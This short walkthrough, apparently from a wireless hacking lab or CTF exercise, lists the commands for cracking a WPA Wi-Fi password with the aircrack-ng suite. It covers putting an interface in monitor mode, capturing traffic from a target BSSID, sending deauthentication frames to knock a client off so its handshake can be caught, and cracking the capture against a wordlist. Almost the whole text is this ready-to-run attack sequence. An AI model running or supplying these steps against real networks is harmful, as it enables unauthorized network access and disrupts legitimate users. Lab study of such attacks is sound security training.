So now we have access to wifi! 
What we need to do is:
a) Set it on monitor mode:
sudo airmon-ng start sta3-wlan0
(it is already on monitor mode, so this is not necessary)
b) Capture the packets and see the network:
sudo airodump-ng sta3-wlan0
c) Identify the Target Network
Look for: The ESSID (network name) and BSSID (MAC address) 
of the network you want to crack, as well as the channel 
it's operating on.
d) Capture packets specifically from target network, which increases the likelihood 
of capturing the handshake quickly.

sudo airodump-ng --bssid <TARGET_BSSID> --channel <CHANNEL> -w capture sta3-wlan0
e) From ANOTHER terminal, disconnect a client, just to take
the handshake:
sudo aireplay-ng --deauth 1 -a <TARGET_BSSID> sta3-wlan0
f) After capturing the handshake (it should be shown on top right on monitoring)
stop capturing (with ctrl + c)
g) Crack the handshake!
aircrack-ng capture-01.cap -w <path_to_wordlist>
